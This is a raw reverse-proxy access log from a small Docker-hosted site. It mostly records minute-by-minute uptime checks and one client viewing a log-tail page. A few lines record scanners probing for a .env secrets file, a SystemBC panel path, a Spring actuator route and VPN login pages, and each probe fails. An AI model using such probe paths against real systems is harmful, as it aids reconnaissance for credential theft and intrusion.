173.48.140.140 - - [17/Dec/2023:01:06:45 +0000] "GET /logs/ HTTP/2.0" 200 1036 "-" "-" 4222 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:06:45 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 200 1387 "-" "-" 4223 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:07:09 +0000] "GET /logs/ HTTP/2.0" 200 1007 "-" "-" 4224 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:07:09 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4225 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:07:11 +0000] "GET /logs/logtail.php HTTP/2.0" 500 0 "-" "-" 4226 "www@docker" "http://172.29.0.8:80" 5ms
159.203.109.206 - - [17/Dec/2023:01:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4227 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4228 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:07:41 +0000] "GET /logtail.php HTTP/2.0" 404 16 "-" "-" 4229 "www@docker" "http://172.29.0.8:80" 4ms
159.203.109.206 - - [17/Dec/2023:01:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4230 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4231 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:08:48 +0000] "GET /logtail.php HTTP/2.0" 404 16 "-" "-" 4232 "www@docker" "http://172.29.0.8:80" 4ms
35.216.205.103 - - [17/Dec/2023:01:08:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4233 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:01:09:15 +0000] "GET /logtail.php HTTP/2.0" 404 16 "-" "-" 4234 "www@docker" "http://172.29.0.8:80" 4ms
159.203.109.206 - - [17/Dec/2023:01:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4235 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4236 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:09:49 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4237 "www@docker" "http://172.29.0.8:80" 5ms
159.203.109.206 - - [17/Dec/2023:01:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4238 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4239 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4240 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:11:30 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 4241 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:11:30 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4242 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:11:32 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4243 "www@docker" "http://172.29.0.8:80" 4ms
167.71.120.76 - - [17/Dec/2023:01:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4244 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4245 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:12:24 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 4246 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:12:24 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4247 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:12:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4248 "www@docker" "http://172.29.0.8:80" 4ms
167.71.120.76 - - [17/Dec/2023:01:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4249 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:13:11 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4250 "www@docker" "http://172.29.0.8:80" 4ms
173.48.140.140 - - [17/Dec/2023:01:13:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4251 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:13:17 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 4252 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:13:17 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4253 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:13:18 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4254 "www@docker" "http://172.29.0.8:80" 2ms
159.203.109.206 - - [17/Dec/2023:01:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4255 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4256 "www@docker" "http://172.29.0.8:80" 0ms
213.32.39.41 - - [17/Dec/2023:01:13:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4257 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4258 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4259 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4260 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4261 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4262 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4263 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4264 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:17:31 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4265 "www@docker" "http://172.29.0.8:80" 4ms
173.48.140.140 - - [17/Dec/2023:01:17:33 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4266 "www@docker" "http://172.29.0.8:80" 2ms
167.71.120.76 - - [17/Dec/2023:01:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4267 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:17:42 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 4268 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:17:42 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4269 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:17:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3523 "-" "-" 4270 "www@docker" "http://172.29.0.8:80" 2ms
159.203.109.206 - - [17/Dec/2023:01:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4271 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4272 "www@docker" "http://172.29.0.8:80" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4273 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4274 "-" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:57 +0000] "GET /systembc/password.php HTTP/1.1" 301 17 "-" "-" 4275 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:57 +0000] "GET /systembc/password.php HTTP/1.1" 404 19 "-" "-" 4276 "-" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:57 +0000] "GET /Ep1v HTTP/1.1" 301 17 "-" "-" 4277 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:57 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 4278 "-" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:58 +0000] "GET /GWqN HTTP/1.1" 301 17 "-" "-" 4279 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [17/Dec/2023:01:18:58 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 4280 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:01:19:14 +0000] "GET /logs/ HTTP/2.0" 200 1020 "-" "-" 4281 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:19:14 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4282 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:19:16 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2387 "-" "-" 4283 "www@docker" "http://172.29.0.8:80" 5ms
159.203.109.206 - - [17/Dec/2023:01:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4284 "www@docker" "http://172.29.0.8:80" 0ms
2.56.247.167 - - [17/Dec/2023:01:19:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4285 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:01:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4286 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [17/Dec/2023:01:19:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4287 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4288 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4289 "www@docker" "http://172.29.0.8:80" 1ms
57.129.23.166 - - [17/Dec/2023:01:20:54 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4290 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [17/Dec/2023:01:20:55 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4291 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4292 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4293 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4294 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4295 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [17/Dec/2023:01:23:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4296 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4297 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4298 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4299 "www@docker" "http://172.29.0.8:80" 0ms
68.69.186.30 - - [17/Dec/2023:01:24:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4300 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:01:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4301 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4302 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4303 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4304 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4305 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4306 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4307 "www@docker" "http://172.29.0.8:80" 0ms
45.95.147.236 - - [17/Dec/2023:01:27:55 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 4308 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4309 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4310 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4311 "www@docker" "http://172.29.0.8:80" 0ms
91.92.249.130 - - [17/Dec/2023:01:29:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4312 "-" "-" 0ms
91.92.249.130 - - [17/Dec/2023:01:29:28 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 4313 "-" "-" 0ms
91.92.249.130 - - [17/Dec/2023:01:29:30 +0000] "GET /vpn/index.html HTTP/1.1" 404 19 "-" "-" 4314 "-" "-" 0ms
91.92.249.130 - - [17/Dec/2023:01:29:32 +0000] "GET /global-protect/login.esp HTTP/1.1" 404 19 "-" "-" 4315 "-" "-" 0ms
91.92.249.130 - - [17/Dec/2023:01:29:35 +0000] "GET /sslvpn_logon.shtml HTTP/1.1" 404 19 "-" "-" 4316 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:01:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4317 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4318 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4319 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4320 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4321 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4322 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4323 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4324 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4325 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4326 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4327 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4328 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4329 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4330 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4331 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4332 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4333 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4334 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4335 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4336 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4337 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4338 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4339 "www@docker" "http://172.29.0.8:80" 0ms
205.210.31.97 - - [17/Dec/2023:01:40:36 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 4340 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4341 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:41:31 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 4342 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:41:31 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 4343 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:01:41:33 +0000] "GET /logs/logtail.php HTTP/2.0" 500 0 "-" "-" 4344 "www@docker" "http://172.29.0.8:80" 4ms
167.71.120.76 - - [17/Dec/2023:01:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4345 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1 "www@docker" "http://172.30.0.8:80" 48ms
159.203.109.206 - - [17/Dec/2023:02:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2 "www@docker" "http://172.30.0.8:80" 40ms
167.71.120.76 - - [17/Dec/2023:02:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3 "www@docker" "http://172.30.0.8:80" 16ms
173.48.140.140 - - [17/Dec/2023:02:36:11 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2333 "-" "-" 4 "www@docker" "http://172.30.0.8:80" 28ms
173.48.140.140 - - [17/Dec/2023:02:36:21 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2351 "-" "-" 5 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:02:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7 "www@docker" "http://172.30.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:02:37:17 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8 "www@docker" "http://172.30.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:02:37:17 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 9 "www@docker" "http://172.30.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:02:37:19 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2395 "-" "-" 10 "www@docker" "http://172.30.0.8:80" 5ms
159.203.109.206 - - [17/Dec/2023:02:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:02:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 13 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 14 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 15 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 16 "www@docker" "http://172.30.0.8:80" 27ms
173.48.140.140 - - [17/Dec/2023:02:39:41 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 17 "www@docker" "http://172.30.0.8:80" 12ms
173.48.140.140 - - [17/Dec/2023:02:39:43 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2377 "-" "-" 18 "www@docker" "http://172.30.0.8:80" 4ms
159.203.109.206 - - [17/Dec/2023:02:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 19 "www@docker" "http://172.30.0.8:80" 19ms
167.71.120.76 - - [17/Dec/2023:02:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 20 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 21 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 22 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:02:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 23 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 24 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 25 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 26 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:02:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 27 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 28 "www@docker" "http://172.30.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:02:44:55 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 29 "www@docker" "http://172.30.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:02:44:57 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2317 "-" "-" 30 "www@docker" "http://172.30.0.8:80" 4ms
159.203.109.206 - - [17/Dec/2023:02:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 31 "www@docker" "http://172.30.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:02:45:25 +0000] "GET /logs/ HTTP/2.0" 200 1020 "-" "-" 32 "www@docker" "http://172.30.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:02:45:25 +0000] "GET /logs/styles.css?version=0.9 HTTP/2.0" 200 1331 "-" "-" 33 "www@docker" "http://172.30.0.8:80" 1ms
173.48.140.140 - - [17/Dec/2023:02:45:27 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2367 "-" "-" 34 "www@docker" "http://172.30.0.8:80" 4ms
167.71.120.76 - - [17/Dec/2023:02:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 35 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 36 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:02:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 37 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:02:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 38 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:02:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 39 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 40 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 41 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 42 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 43 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 44 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 45 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 46 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 47 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 48 "www@docker" "http://172.30.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:02:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 49 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 50 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:02:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 51 "www@docker" "http://172.30.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:02:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 52 "www@docker" "http://172.30.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:02:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 53 "www@docker" "http://172.30.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:02:54:50 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2295 "-" "-" 54 "www@docker" "http://172.30.0.8:80" 4ms
173.48.140.140 - - [17/Dec/2023:02:54:55 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2311 "-" "-" 55 "www@docker" "http://172.30.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:02:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 56 "www@docker" "http://172.30.0.8:80" 0ms
